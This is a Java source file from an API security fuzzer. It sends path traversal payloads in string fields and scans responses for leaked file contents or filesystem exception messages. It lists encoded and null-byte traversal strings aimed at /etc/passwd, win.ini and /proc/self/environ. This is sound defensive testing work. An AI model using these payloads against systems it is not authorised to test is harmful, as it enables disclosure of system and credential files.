package com.endava.cats.fuzzer.fields;

import com.endava.cats.annotations.FieldFuzzer;
import com.endava.cats.args.SecurityFuzzerArguments;
import com.endava.cats.fuzzer.executor.SimpleExecutor;
import com.endava.cats.fuzzer.fields.base.BaseSecurityInjectionFuzzer;
import com.endava.cats.model.CatsResponse;
import com.endava.cats.model.CatsResultFactory;
import com.endava.cats.model.FuzzingData;
import com.endava.cats.report.TestCaseListener;
import jakarta.inject.Singleton;

import java.util.ArrayList;
import java.util.List;
import java.util.Locale;

/**
 * Sends relative and encoded Path Traversal (Local File Inclusion) payloads in string fields
 * and inspects responses for file content disclosure or unmasked filesystem error leaks.
 */
@Singleton
@FieldFuzzer
public class PathTraversalInStringFieldsFuzzer extends BaseSecurityInjectionFuzzer {

    static final List<String> TOP_PATH_TRAVERSAL_PAYLOADS = List.of(
            "../../../../etc/passwd",
            "..\\..\\..\\..\\windows\\win.ini",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252f..%252fetc%252fpasswd",
            "....//....//....//....//etc/passwd",
            "/var/www/../../etc/passwd",
            "../../../../etc/passwd\u0000.png",
            "..%c0%af..%c0%af..%c0%afetc/passwd",
            "../../../../proc/self/environ",
            "C:\\Windows\\System32\\drivers\\etc\\hosts");

    static final List<String> ALL_PATH_TRAVERSAL_PAYLOADS = List.of(
            "../../../../etc/passwd",
            "../../../../../../../etc/passwd",
            "..\\..\\..\\..\\windows\\win.ini",
            "..\\..\\..\\..\\..\\..\\windows\\win.ini",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini",
            "..%252f..%252f..%252f..%252fetc%252fpasswd",
            "....//....//....//....//etc/passwd",
            "....\\\\....\\\\....\\\\windows\\win.ini",
            "/var/www/../../etc/passwd",
            "../../../../etc/passwd\u0000.png",
            "../../../../etc/passwd%00.jpg",
            "..%c0%af..%c0%af..%c0%afetc/passwd",
            "../../../../proc/self/environ",
            "../../../../etc/hosts",
            "C:\\Windows\\System32\\drivers\\etc\\hosts",
            "/etc/passwd");

    public PathTraversalInStringFieldsFuzzer(SimpleExecutor simpleExecutor, TestCaseListener testCaseListener,
                                             SecurityFuzzerArguments securityFuzzerArguments) {
        super(simpleExecutor, testCaseListener, securityFuzzerArguments);
    }

    @Override
    protected String getInjectionType() {
        return "PathTraversal";
    }

    @Override
    protected List<String> getTopInjectionPayloads() {
        return TOP_PATH_TRAVERSAL_PAYLOADS;
    }

    @Override
    protected List<String> getAllInjectionPayloads() {
        return ALL_PATH_TRAVERSAL_PAYLOADS;
    }

    @Override
    protected InjectionDetectionResult detectInjectionEvidence(CatsResponse response, FuzzingData data) {
        String body = response.getBody() != null ? response.getBody().toLowerCase(Locale.ROOT) : "";
        List<String> indicators = collectEvidence(body);
        if (indicators.isEmpty()) {
            return InjectionDetectionResult.notVulnerable();
        }
        return InjectionDetectionResult.vulnerable(
                CatsResultFactory.Reason.PATH_TRAVERSAL.value(),
                "Response contains path traversal disclosure indicators (%s) with status %d"
                        .formatted(String.join(", ", indicators), response.getResponseCode()));
    }

    private static List<String> collectEvidence(String body) {
        List<String> matches = new ArrayList<>();
        if (body.contains("root:") && (body.contains("/bin/") || body.contains(":0:0:"))) {
            matches.add("/etc/passwd content");
        }
        if (body.contains("[extensions]") && body.contains("[fonts]")) {
            matches.add("win.ini content");
        }
        if (body.contains("path=") && body.contains("home=") && body.contains("user=")) {
            matches.add("/proc/self/environ content");
        }
        if (hasFilesystemExceptionLeak(body)) {
            matches.add("filesystem exception leak");
        }
        return matches;
    }

    private static final List<String> FILESYSTEM_EXCEPTION_INDICATORS = List.of(
            // Java
            "java.io.filenotfoundexception",
            "java.nio.file.nosuchfileexception",
            "java.nio.file.accessdeniedexception",
            // Node.js / POSIX
            "enoent: no such file or directory",
            "eacces: permission denied",
            "eisdir: illegal operation on a directory",
            // Python
            "filenotfounderror: [errno 2]",
            "permissionerror: [errno 13]",
            "isadirectoryerror: [errno 21]",
            "notadirectoryerror: [errno 20]",
            // .NET / C#
            "system.io.filenotfoundexception",
            "system.io.directorynotfoundexception",
            "system.unauthorizedaccessexception",
            "could not find a part of the path",
            // Go / Rust / OS-level open errors
            ": no such file or directory",
            "oserror: [errno",
            // PHP
            "failed to open stream: no such file or directory",
            "failed to open stream: permission denied",
            "open_basedir restriction in effect",
            // Ruby
            "errno::enoent",
            "errno::eacces"
    );

    private static boolean hasFilesystemExceptionLeak(String body) {
        return FILESYSTEM_EXCEPTION_INDICATORS.stream().anyMatch(body::contains);
    }

    @Override
    public String description() {
        return "iterate through each string field and send path traversal payloads to detect local file inclusion or filesystem path leaks";
    }
}
